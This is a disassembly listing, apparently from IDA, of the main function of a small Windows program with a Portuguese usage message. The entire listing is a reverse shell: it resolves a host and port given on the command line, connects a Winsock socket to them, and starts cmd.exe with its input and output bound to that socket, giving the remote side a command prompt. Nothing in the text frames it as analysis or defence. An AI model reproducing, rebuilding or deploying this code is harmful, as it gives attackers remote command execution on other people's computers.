.text:00411950 ; =============== S U B R O U T I N E =======================================
.text:00411950
.text:00411950 ; Attributes: bp-based frame
.text:00411950
.text:00411950 ; int __cdecl main(int argc, char **argv)
.text:00411950 _main           proc near               ; CODE XREF: j__main↑j
.text:00411950
.text:00411950 var_C           = byte ptr -0Ch
.text:00411950 host            = dword ptr -8
.text:00411950 argc            = dword ptr  8
.text:00411950 argv            = dword ptr  0Ch
.text:00411950
.text:00411950                 push    ebp
.text:00411951                 mov     ebp, esp
.text:00411953                 sub     esp, 0CCh
.text:00411959                 push    ebx
.text:0041195A                 push    esi
.text:0041195B                 push    edi
.text:0041195C
.text:0041195C __$EncStackInitStart_2:
.text:0041195C                 lea     edi, [ebp+var_C]
.text:0041195F                 mov     ecx, 3
.text:00411964                 mov     eax, 0CCCCCCCCh
.text:00411969                 rep stosd
.text:0041196B
.text:0041196B __$EncStackInitEnd_2:                   ; JMC_flag
.text:0041196B                 mov     ecx, offset _169CFD2C_main@c
.text:00411970                 call    j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x)
.text:00411975                 nop
.text:00411976                 mov     esi, esp
.text:00411978                 push    offset _wsaData ; lpWSAData
.text:0041197D                 push    202h            ; wVersionRequested
.text:00411982                 call    ds:__imp__WSAStartup@8 ; WSAStartup(x,x)
.text:00411988                 cmp     esi, esp
.text:0041198A                 call    j___RTC_CheckEsp
.text:0041198F                 nop
.text:00411990                 mov     esi, esp
.text:00411992                 push    0               ; dwFlags
.text:00411994                 push    0               ; g
.text:00411996                 push    0               ; lpProtocolInfo
.text:00411998                 push    6               ; protocol
.text:0041199A                 push    1               ; type
.text:0041199C                 push    2               ; af
.text:0041199E                 call    ds:__imp__WSASocketW@24 ; WSASocketW(x,x,x,x,x,x)
.text:004119A4                 cmp     esi, esp
.text:004119A6                 call    j___RTC_CheckEsp
.text:004119AB                 mov     _Winsock, eax
.text:004119B0                 cmp     [ebp+argv], 3
.text:004119B4                 jz      short loc_4119EA
.text:004119B6                 push    offset _Format  ; "Uso: <rhost> <rport>\n"
.text:004119BB                 mov     esi, esp
.text:004119BD                 push    2               ; Ix
.text:004119BF                 call    ds:__imp____acrt_iob_func
.text:004119C5                 add     esp, 4
.text:004119C8                 cmp     esi, esp
.text:004119CA                 call    j___RTC_CheckEsp
.text:004119CF                 push    eax             ; _Stream
.text:004119D0                 call    j__fprintf
.text:004119D5                 add     esp, 8
.text:004119D8                 mov     esi, esp
.text:004119DA                 push    1               ; Code
.text:004119DC                 call    ds:__imp__exit
.text:004119E2 ; ---------------------------------------------------------------------------
.text:004119E2                 cmp     esi, esp
.text:004119E4                 call    j___RTC_CheckEsp
.text:004119E9                 nop
.text:004119EA
.text:004119EA loc_4119EA:                             ; CODE XREF: _main+64↑j
.text:004119EA                 mov     eax, 4
.text:004119EF                 shl     eax, 0
.text:004119F2                 mov     esi, esp
.text:004119F4                 mov     ecx, [ebp+argv]
.text:004119F7                 mov     edx, [ecx+eax]
.text:004119FA                 push    edx             ; name
.text:004119FB                 call    ds:__imp__gethostbyname@4 ; gethostbyname(x)
.text:00411A01                 cmp     esi, esp
.text:00411A03                 call    j___RTC_CheckEsp
.text:00411A08                 mov     [ebp+host], eax
.text:00411A0B                 mov     eax, 4
.text:00411A10                 imul    ecx, eax, 0
.text:00411A13                 mov     edx, [ebp+host]
.text:00411A16                 mov     eax, [edx+0Ch]
.text:00411A19                 mov     ecx, [ecx+eax]
.text:00411A1C                 mov     esi, esp
.text:00411A1E                 mov     edx, [ecx]
.text:00411A20                 push    edx             ; in
.text:00411A21                 call    ds:__imp__inet_ntoa@4 ; inet_ntoa(x)
.text:00411A27                 cmp     esi, esp
.text:00411A29                 call    j___RTC_CheckEsp
.text:00411A2E                 push    eax             ; Source
.text:00411A2F                 push    offset _ip_addr ; Destination
.text:00411A34                 call    j__strcpy
.text:00411A39                 add     esp, 8
.text:00411A3C                 mov     eax, 2
.text:00411A41                 mov     _hax.sin_family, ax
.text:00411A47                 mov     eax, 4
.text:00411A4C                 shl     eax, 1
.text:00411A4E                 mov     esi, esp
.text:00411A50                 mov     ecx, [ebp+argv]
.text:00411A53                 mov     edx, [ecx+eax]
.text:00411A56                 push    edx             ; String
.text:00411A57                 call    ds:__imp__atoi
.text:00411A5D                 add     esp, 4
.text:00411A60                 cmp     esi, esp
.text:00411A62                 call    j___RTC_CheckEsp
.text:00411A67                 mov     esi, esp
.text:00411A69                 push    eax             ; hostshort
.text:00411A6A                 call    ds:__imp__htons@4 ; htons(x)
.text:00411A70                 cmp     esi, esp
.text:00411A72                 call    j___RTC_CheckEsp
.text:00411A77                 mov     _hax.sin_port, ax
.text:00411A7D                 mov     esi, esp
.text:00411A7F                 push    offset _ip_addr ; cp
.text:00411A84                 call    ds:__imp__inet_addr@4 ; inet_addr(x)
.text:00411A8A                 cmp     esi, esp
.text:00411A8C                 call    j___RTC_CheckEsp
.text:00411A91                 mov     dword ptr _hax.sin_addr.S_un, eax
.text:00411A96                 mov     esi, esp
.text:00411A98                 push    0               ; lpGQOS
.text:00411A9A                 push    0               ; lpSQOS
.text:00411A9C                 push    0               ; lpCalleeData
.text:00411A9E                 push    0               ; lpCallerData
.text:00411AA0                 push    10h             ; namelen
.text:00411AA2                 push    offset _hax     ; name
.text:00411AA7                 mov     eax, _Winsock
.text:00411AAC                 push    eax             ; s
.text:00411AAD                 call    ds:__imp__WSAConnect@28 ; WSAConnect(x,x,x,x,x,x,x)
.text:00411AB3                 cmp     esi, esp
.text:00411AB5                 call    j___RTC_CheckEsp
.text:00411ABA                 nop
.text:00411ABB                 push    44h ; 'D'       ; Size
.text:00411ABD                 push    0               ; Val
.text:00411ABF                 push    offset _ini_processo ; void *
.text:00411AC4                 call    j__memset
.text:00411AC9                 add     esp, 0Ch
.text:00411ACC                 mov     _ini_processo.cb, 44h ; 'D'
.text:00411AD6                 mov     _ini_processo.dwFlags, 100h
.text:00411AE0                 mov     eax, _Winsock
.text:00411AE5                 mov     _ini_processo.hStdError, eax
.text:00411AEA                 mov     ecx, _ini_processo.hStdError
.text:00411AF0                 mov     _ini_processo.hStdOutput, ecx
.text:00411AF6                 mov     edx, _ini_processo.hStdOutput
.text:00411AFC                 mov     _ini_processo.hStdInput, edx
.text:00411B02                 mov     esi, esp
.text:00411B04                 push    offset _processo_info ; lpProcessInformation
.text:00411B09                 push    offset _ini_processo ; lpStartupInfo
.text:00411B0E                 push    0               ; lpCurrentDirectory
.text:00411B10                 push    0               ; lpEnvironment
.text:00411B12                 push    0               ; dwCreationFlags
.text:00411B14                 push    1               ; bInheritHandles
.text:00411B16                 push    0               ; lpThreadAttributes
.text:00411B18                 push    0               ; lpProcessAttributes
.text:00411B1A                 push    offset CommandLine ; "cmd.exe"
.text:00411B1F                 push    0               ; lpApplicationName
.text:00411B21                 call    ds:__imp__CreateProcessW@40 ; CreateProcessW(x,x,x,x,x,x,x,x,x,x)
.text:00411B27                 cmp     esi, esp
.text:00411B29                 call    j___RTC_CheckEsp
.text:00411B2E                 nop
.text:00411B2F                 xor     eax, eax
.text:00411B31                 pop     edi
.text:00411B32                 pop     esi
.text:00411B33                 pop     ebx
.text:00411B34                 add     esp, 0CCh
.text:00411B3A                 cmp     ebp, esp
.text:00411B3C                 call    j___RTC_CheckEsp
.text:00411B41                 mov     esp, ebp
.text:00411B43                 pop     ebp
.text:00411B44                 retn
.text:00411B44 _main           endp